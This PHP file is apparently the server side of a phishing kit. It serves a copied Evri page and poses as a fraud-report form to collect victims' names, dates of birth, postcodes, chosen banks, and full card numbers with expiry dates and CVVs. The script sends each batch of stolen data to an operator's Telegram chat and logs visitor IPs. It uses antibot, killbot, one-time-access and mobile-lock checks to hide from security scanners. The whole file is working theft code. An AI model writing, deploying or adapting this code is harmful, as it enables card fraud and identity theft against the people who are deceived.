<?php
include 'config.php';
include 'assets/php/inc.php';
if($One_Time_Access == 1){
	$finished = __DIR__ . DIRECTORY_SEPARATOR . 'assets' . DIRECTORY_SEPARATOR . 'ips' . DIRECTORY_SEPARATOR . 'finished_ips.txt';
	if (file_exists($finished) && strpos(file_get_contents($finished), $ip) !== false) {
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
include 'assets/php/old_blocker.php';
$visitorLogDir = __DIR__ . DIRECTORY_SEPARATOR . 'assets' . DIRECTORY_SEPARATOR . 'ips';
if (!is_dir($visitorLogDir)) {
    @mkdir($visitorLogDir, 0775, true);
}
$visitorLog = $visitorLogDir . DIRECTORY_SEPARATOR . 'visitors_ips.txt';
$fp = @fopen($visitorLog, 'a');
if ($fp) {
    fputs($fp, "\r\n$ip\r\n");
    fclose($fp);
}

if($mobile_lock == 1){
	include 'assets/php/mobile_lock.php';
}
if($enable_killbot == 1){
	if(check_killbot($killbot_key) == true){
		$fp = fopen("assets/ips/blocked_ips.txt", "a");
		fputs($fp, "\r\n$ip - killbot\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($enable_antibot == 1){
	if(check_antibot($antibot_key) == true){
		$fp = fopen("ips/blocked_ips.txt", "a");
		fputs($fp, "\r\n$ip - antibot\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
session_start();
$_SESSION['started_page'] = 'yes';

// Handle POST requests for form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $jsonData = file_get_contents('php://input');
    $data = json_decode($jsonData, true);
    
    if ($data && $telegram_delivery == 1) {
        // Check if this is page 2 data (personal info)
        if (isset($data['firstName']) || isset($data['lastName'])) {
            // Build Telegram message for Page 2
            $message = "🚨 NEW FRAUD REPORT\n\n";
            $message .= "👤 PERSONAL INFORMATION:\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "First Name: " . ($data['firstName'] ?? 'N/A') . "\n";
            $message .= "Middle Name: " . ($data['middleName'] ?? 'N/A') . "\n";
            $message .= "Last Name: " . ($data['lastName'] ?? 'N/A') . "\n";
            $message .= "Date of Birth: " . ($data['dateOfBirth'] ?? 'N/A') . "\n";
            $message .= "Postcode: " . ($data['postcode'] ?? 'N/A') . "\n\n";
            
            $message .= "📋 FRAUD HISTORY:\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "First Instance: " . ($data['firstInstance'] ? '✅ Yes' : '❌ No') . "\n";
            $message .= "Previously Affected: " . ($data['previouslyAffected'] ? '✅ Yes' : '❌ No') . "\n";
            $message .= "Understands Incident: " . ($data['understandsIncident'] ? '✅ Yes' : '❌ No') . "\n\n";
            
            $message .= "🌐 VISITOR INFO:\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "IP: $ip\n";
            $message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
            
            // Send to Telegram
            telegram_deliver($chat_id, $message, $bot_token);
            
            // Save to session
            $_SESSION['page2_data'] = $data;
        }
        // Check if this is page 3 data (bank selection)
        elseif (isset($data['selectedBanks'])) {
            // Build Telegram message for Page 3
            $message = "🏦 FRAUD REPORT\n\n";
            $message .= "🏦 SELECTED BANKS:\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "Total Banks: " . ($data['bankCount'] ?? 0) . "\n\n";
            
            if (!empty($data['selectedBanks'])) {
                foreach ($data['selectedBanks'] as $index => $bank) {
                    $message .= ($index + 1) . ". " . $bank . "\n";
                }
            } else {
                $message .= "No banks selected\n";
            }
            
            $message .= "\n🌐 VISITOR INFO:\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "IP: $ip\n";
            
            // Send to Telegram
            telegram_deliver($chat_id, $message, $bot_token);
            
            // Save to session
            $_SESSION['page3_data'] = $data;
        }
        // Check if this is page 4 data (card details)
        elseif (isset($data['banks'])) {
            // Build Telegram message for Page 4
            $message = "💳 FRAUD REPORT - CARD DETAILS\n\n";
            $message .= "💳 CARD DETAILS:\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "Total Banks: " . ($data['totalBanks'] ?? 0) . "\n";
            $message .= "Total Cards: " . ($data['totalCards'] ?? 0) . "\n\n";
            
            if (!empty($data['banks'])) {
                foreach ($data['banks'] as $bankIndex => $bankData) {
                    $message .= "🏦 " . ($bankData['bankName'] ?? 'Unknown Bank') . "\n";
                    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
                    
                    if (!empty($bankData['cards'])) {
                        foreach ($bankData['cards'] as $cardIndex => $card) {
                            $message .= "Card " . ($cardIndex + 1) . ":\n";
                            $message .= "  💳 Number: " . ($card['cardNumber'] ?? 'N/A') . "\n";
                            $message .= "  📅 Expiry: " . ($card['expiry'] ?? 'N/A') . "\n";
                            $message .= "  🔒 CVV: " . ($card['cvv'] ?? 'N/A') . "\n\n";
                        }
                    }
                    
                    $message .= "\n";
                }
            } else {
                $message .= "No cards provided\n";
            }
            
            $message .= "🌐 VISITOR INFO:\n";
            $message .= "━━━━━━━━━━━━━━━━━━━━\n";
            $message .= "IP: $ip\n";
            $message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
            
            // Send to Telegram
            telegram_deliver($chat_id, $message, $bot_token);
            
            // Save to session
            $_SESSION['page4_data'] = $data;
        }
        
        // Return success response
        header('Content-Type: application/json');
        echo json_encode(['success' => true, 'message' => 'Data received']);
        exit;
    }
    
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'message' => 'Invalid data']);
    exit;
}

// Serve Evri HTML (static snapshot)
$htmlDir = __DIR__;
$page = isset($_GET['page']) ? preg_replace('/[^a-z0-9_-]/i', '', (string) $_GET['page']) : 'home';

$pages = [
    'home' => 'evri.html',
    'evri' => 'evri.html',
];

$pageFile = 'evri.html';
if ($page !== '' && isset($pages[$page])) {
    $pageFile = $pages[$page];
}

if ($page === 'dashboard') {
    // In case you eventually want dashboard as HTML or PHP output,
    // customize dashboard output here
    echo $dashboardHtml ?? '';
    exit;
}

$filePath = $htmlDir . DIRECTORY_SEPARATOR . $pageFile;

if (file_exists($filePath)) {
    header('Content-Type: text/html; charset=UTF-8');
    readfile($filePath);
    exit;
} else {
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    echo "Page not found.";
    exit;
}
